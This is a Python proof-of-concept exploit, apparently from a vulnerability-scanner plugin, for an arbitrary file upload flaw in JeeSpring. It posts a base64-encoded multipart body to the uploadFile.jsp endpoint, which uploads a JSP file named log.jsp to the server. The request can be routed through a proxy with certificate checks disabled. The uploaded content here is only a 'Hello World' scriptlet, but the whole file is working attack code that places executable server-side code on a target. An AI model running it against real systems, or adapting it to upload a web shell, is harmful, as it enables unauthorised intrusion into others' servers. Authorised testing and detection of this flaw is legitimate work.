import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import random
import base64

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0',
            'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apn g,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
            'Connection': 'close'
        }
        payload2 = b'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo='
        payload = base64.b64decode(payload2)
        path = 'static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/'
        logging.captureWarnings(True)
        aa1=requests.post(url1+path,cookies=s_cookie,data=payload,headers=header,proxies=proxies,verify=False, timeout=5)
        if aa1.status_code == 200 and 'jsp' in aa1.text:
            cdd='[+]漏洞存在\n'+str(aa1.text)
        else:
            cdd='[-]漏洞不存在\n'
    except Exception as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ Spring JeeSpring_2023任意文件上传 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)